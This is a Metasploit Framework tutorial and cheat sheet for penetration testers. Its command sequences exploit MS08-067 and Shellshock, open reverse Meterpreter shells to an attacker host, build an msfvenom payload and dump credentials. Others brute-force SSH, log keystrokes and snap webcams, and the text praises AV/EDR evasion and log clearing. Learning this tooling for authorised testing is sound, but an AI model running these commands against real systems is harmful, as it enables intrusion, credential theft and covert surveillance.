---
icon: explosion
---

# MetaSploit

## The Metasploit Framework Masterclass: Professional Penetration Testing & Automation

Metasploit Framework is the most powerful and flexible open-source exploitation and post-exploitation toolkit available for security professionals, red teams, and bug bounty hunters. Its modularity covers every phase: reconnaissance, vulnerability identification, exploitation, privilege escalation, persistence, pivoting, evidence collection, and reporting.

***

### I. Core Capabilities & Workflow

* **Module-Driven Exploitation:** Thousands of modules—exploits, payloads, auxiliaries, post-exploitation, and encoders—covering Windows, Linux, web, IoT, and network devices.\[1]\[2]\[3]\[4]
* **Integrated Workflow:** Recon, scanning, exploitation, and post-exploitation in one framework with workspace/project management.\[3]\[4]
* **Smart Payloads:** Meterpreter, shell, stageless/staged, reverse/bind, HTTP/HTTPS, DNS payload options for advanced evasion and control.\[1]\[3]
* **Automated & Custom Exploitation:** Manual targeting or automated exploit campaigns, with customizable parameters for precision or mass exploitation.\[5]\[6]
* **Post-Exploitation Modules:** Privilege escalation, credential dumping, keystroke logging, evidence collection, memory forensics, data exfiltration, and network pivoting.\[7]
* **Persistence & Lateral Movement:** Persistence, route/socks proxies, pivoting to internal networks, and session management for multi-target operations.\[7]\[1]
* **Powerful Scripting/API:** Automate engagement workflows with msfconsole resource scripting, msfvenom (payload customization), and robust API for CI/CD or SOC integration.\[3]\[1]
* **Collaboration/Reporting:** Centralized reporting and proof-of-exploit artifacts for client delivery or bug bounty submission.\[8]\[3]
* **Evasion & OpSec:** Encoders, staged payloads, scriptless attacks, and bypass modules help evade EDR, AV, and blue teams.\[2]\[9]

***

### II. Professional Usage Examples

#### Scan, Exploit, and Pivot

```bash
msfconsole

```

* Import Nmap results or scan directly:`db_nmap -A target.com`
* Search for exploits:`search type:exploit platform:windows name:ms08_067`
* Use an exploit:`use exploit/windows/smb/ms08_067_netapi`
* Set options:`set RHOSTS target.com`
* Choose payload:`set PAYLOAD windows/meterpreter/reverse_tcp`
* Launch:`run`

#### Meterpreter Post-Exploitation

*   Privilege escalation:

    ```
    use post/windows/escalate/getsystem
    run

    ```
*   Dump credentials:

    ```
    use post/windows/gather/credentials/mimikatz
    run

    ```
*   Persistence:

    ```
    use post/windows/manage/persistence
    run

    ```
*   Internal recon, pivot:

    ```
    use post/multi/manage/autoroute
    set SESSION x
    run

    ```

#### Scripting & Automation

*   Run automated resource script:

    ```bash
    msfconsole -r commands.rc

    ```
*   Build custom payload with msfvenom:

    ```bash
    msfvenom -p windows/meterpreter/reverse_https LHOST=attacker LPORT=443 -f exe > shell.exe

    ```
*   Execute batch exploit automation:

    ```bash
    use auxiliary/scanner/ssh/ssh_login
    set USER_FILE users.txt
    set PASS_FILE passwords.txt
    set RHOSTS targets.txt
    run

    ```

#### Reporting & Evidence

*   Screenshot, keystroke log, download files, webcam snap:

    ```
    screenshot
    keyscan_start; keyscan_dump
    download C:\\\\\\\\Users\\\\\\\\file.txt
    webcam_snap

    ```

***

### III. Advanced Workflow & Scenarios

* **Multi-Project Management:** Organize targets, evidence, and reporting by project/workspace for parallel engagements.\[1]\[3]
* **Automated Campaigns:** Auto-exploit, multi-handler, and mass credential attack capability; integrate Nessus/OpenVAS output for validated risk mapping.\[5]\[3]
* **Deep Post-Exploitation:** 100+ post-modules covering system info, browser data, kernel and user-mode cred harvesting, lateral movement, and cloud access.\[7]
* **Pivoting/Internal Routing:** Use routing and SOCKS proxies to reach and exploit non-exposed targets in internal networks.\[7]
* **Evasion and Anti-Forensics:** Scriptless in-memory attacks, session migration, AV/EDR bypasses, clearing logs post-exploitation.
* **CI/CD and Integration:** Use the Metasploit RPC API in build pipelines, cloud red teams, or bug bounty automation for continuous engagement.\[10]\[1]

***

### IV. Real-World Workflow Example

1. **Import Recon and Launch Exploitation**

```bash
db_import nmap_results.xml
search type:exploit platform:linux
use exploit/linux/http/apache_mod_cgi_bash_env_exec
set RHOSTS target.com
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST attacker
run

```

1. **Privilege Escalation, Dumping, and Pivot**

```bash
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
use post/linux/gather/hashdump
run
use post/multi/manage/autoroute
run

```

1. **Automate Reporting**

```bash
loot
report

```

***

### V. Pro Tips & Best Practices

* Always keep the framework and module set updated for access to the newest exploits.\[2]\[1]
* Use staged payloads for stealth and network evasion.
* Validate and interpret post-exploitation output—false positives are possible.
* Leverage session management and pivoting options for multi-host/AD attacks.
* Prefer custom meterpreter payloads for interactive, evasive sessions.
* Document everything—screenshot, loot, command logs, session history.
* Respect client scope and authorization at all times.

***

This Metasploit guide empowers offensive security professionals to conduct professional, scalable, and high-credibility assessments across the entire kill chain, from initial recon to full compromise, privilege escalation, lateral movement, and reporting.\[4]\[8]\[10]\[2]\[3]\[1]\[7]

Sources \[1] Metasploit | Penetration Testing Software, Pen Testing ...[https://www.metasploit.com](https://www.metasploit.com) \[2] A step-by-step guide to the Metasploit Framework [https://www.hackthebox.com/blog/metasploit-tutorial](https://www.hackthebox.com/blog/metasploit-tutorial) \[3] Quick Start Guide | Metasploit Documentation [https://docs.rapid7.com/metasploit/quick-start-guide/](https://docs.rapid7.com/metasploit/quick-start-guide/) \[4] How To Use The Metasploit Framework For Penetration ... [https://www.eccouncil.org/cybersecurity-exchange/penetration-testing/metasploit-framework-for-penetration-testing/](https://www.eccouncil.org/cybersecurity-exchange/penetration-testing/metasploit-framework-for-penetration-testing/) \[5] Auto-Exploitation | Metasploit Documentation [https://docs.rapid7.com/metasploit/auto-exploitation/](https://docs.rapid7.com/metasploit/auto-exploitation/) \[6] Exploitation and Penetration Testing with Metasploit [https://www.coursera.org/learn/exploitation-and-penetration-testing-with-metasploit](https://www.coursera.org/learn/exploitation-and-penetration-testing-with-metasploit) \[7] What Are the Post Exploitation Modules in Metasploit? Full ... [https://www.webasha.com/blog/what-are-the-post-exploitation-modules-in-metasploit-full-list-of-top-100-options-with-examples](https://www.webasha.com/blog/what-are-the-post-exploitation-modules-in-metasploit-full-list-of-top-100-options-with-examples) \[8] A New User's Guide to Metasploit Pro [https://www.rapid7.com/globalassets/\_pdfs/whitepaperguide/metasploit-101-n00bs-guide-to-metasploit.pdf](https://www.rapid7.com/globalassets/_pdfs/whitepaperguide/metasploit-101-n00bs-guide-to-metasploit.pdf) \[9] Exploitation and Post-exploitation with Metasploit [https://www.pluralsight.com/courses/exploitation-post-exploitation-metasploit](https://www.pluralsight.com/courses/exploitation-post-exploitation-metasploit) \[10] Home | Metasploit Documentation Penetration Testing ... [https://rapid7.github.io/metasploit-framework/](https://rapid7.github.io/metasploit-framework/)
